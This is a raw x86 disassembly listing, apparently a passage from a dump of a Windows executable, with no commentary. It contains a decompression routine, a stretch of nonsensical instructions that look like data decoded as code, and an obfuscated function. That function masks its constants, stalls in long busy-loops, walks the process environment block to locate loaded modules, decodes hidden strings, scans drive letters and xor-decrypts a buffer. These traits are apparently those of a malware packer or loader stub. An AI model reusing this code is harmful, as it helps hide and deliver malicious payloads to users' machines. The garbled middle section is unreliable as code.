  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
